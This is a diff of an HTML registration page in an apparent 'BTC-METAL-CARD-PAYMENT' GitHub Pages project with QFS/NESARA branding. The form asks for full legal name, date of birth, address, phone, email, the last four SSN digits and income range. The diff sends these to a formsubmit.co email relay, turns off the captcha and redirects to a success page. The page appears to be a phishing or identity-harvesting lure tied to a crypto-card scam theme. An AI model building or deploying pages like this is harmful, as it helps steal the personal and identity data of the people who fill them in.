@@ -2,67 +2,50 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
-  <link rel="icon" type="image/png" href="https://github.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/blob/main/photo%201.jpg?raw=true">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Registration Form</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    /* Overlay for submission */
-    #overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.5s ease;
-    }
-    #overlay.show {
-      opacity: 1;
-      pointer-events: all;
-    }
-  </style>
+
+  <!-- Favicon Added -->
+  <link rel="icon" type="image/png" 
+        href="https://raw.githubusercontent.com/qfsnesaragesara/BTC-METAL-CARD-PAYMENT/main/logo.png">
 </head>
 
 <body class="bg-gray-100 p-6">
-
-  <!-- Overlay -->
-  <div id="overlay">
-    <div class="bg-white p-6 rounded-lg shadow-lg text-center">
-      <p class="text-lg font-semibold">Submitting… please wait</p>
-    </div>
-  </div>
-
   <div class="max-w-xl mx-auto bg-white p-8 rounded-2xl shadow-lg">
     <h2 class="text-2xl font-bold text-center mb-6">Registration Form</h2>
 
-    <form id="registrationForm" 
-          action="https://formbold.com/s/oW1Ay" 
+    <form action="https://formsubmit.co/support@qfsnesaragesara.org"
           method="POST"
           class="space-y-4">
 
-      <!-- Redirect after submit -->
-      <input type="hidden" name="redirectTo" value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html">
+      <!-- Redirect After Successful Submission -->
+      <input type="hidden" 
+             name="_next" 
+             value="https://qfsnesaragesara.github.io/BTC-METAL-CARD-PAYMENT/success-registration.html">
+
+      <!-- Disable Captcha -->
+      <input type="hidden" name="_captcha" value="false">
+
+      <!-- Show table style email -->
+      <input type="hidden" name="_template" value="table">
+
+      <!-- Honeypot (spam protection) -->
+      <input type="text" name="_honey" class="hidden" style="display:none">
 
       <div>
         <label class="font-semibold">Full Legal Name</label>
-        <input type="text" name="Full Name" required class="w-full mt-1 p-3 border rounded-lg" />
+        <input type="text" name="full_name" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
         <label class="font-semibold">Date of Birth</label>
-        <input type="date" name="Date of Birth" required class="w-full mt-1 p-3 border rounded-lg" />
+        <input type="date" name="dob" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
         <label class="font-semibold">Gender</label>
-        <select name="Gender" required class="w-full mt-1 p-3 border rounded-lg">
+        <select name="gender" required class="w-full mt-1 p-3 border rounded-lg">
           <option value="">Select...</option>
           <option value="Male">Male</option>
           <option value="Female">Female</option>
@@ -73,27 +56,27 @@
 
       <div>
         <label class="font-semibold">Address</label>
-        <input type="text" name="Address" required class="w-full mt-1 p-3 border rounded-lg" />
+        <input type="text" name="address" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
         <label class="font-semibold">Phone Number</label>
-        <input type="tel" name="Phone" required class="w-full mt-1 p-3 border rounded-lg" />
+        <input type="tel" name="phone" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
         <label class="font-semibold">Email Address</label>
-        <input type="email" name="Email" required class="w-full mt-1 p-3 border rounded-lg" />
+        <input type="email" name="email" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
-        <label class="font-semibold">Last 4 Digit of SSN</label>
-        <input type="text" name="SSN Last 4" maxlength="4" pattern="\d{4}" required class="w-full mt-1 p-3 border rounded-lg" />
+        <label class="font-semibold">Last 4 of SSN</label>
+        <input type="text" name="ssn_last4" maxlength="4" pattern="\d{4}" required class="w-full mt-1 p-3 border rounded-lg" />
       </div>
 
       <div>
         <label class="font-semibold">Annual Income Range</label>
-        <select name="Income Range" required class="w-full mt-1 p-3 border rounded-lg">
+        <select name="income_range" required class="w-full mt-1 p-3 border rounded-lg">
           <option value="">Select...</option>
           <option value="0–25k">$0 – $25,000</option>
           <option value="25k–50k">$25,000 – $50,000</option>
@@ -102,20 +85,11 @@
         </select>
       </div>
 
-      <button type="submit" class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700">
+      <button type="submit" 
+              class="w-full bg-blue-600 text-white font-semibold p-3 rounded-lg hover:bg-blue-700">
         Submit Registration
       </button>
     </form>
   </div>
-
-  <script>
-    const form = document.getElementById("registrationForm");
-    const overlay = document.getElementById("overlay");
-
-    form.addEventListener("submit", function(){
-      overlay.classList.add("show");
-    });
-  </script>
-
 </body>
 </html>
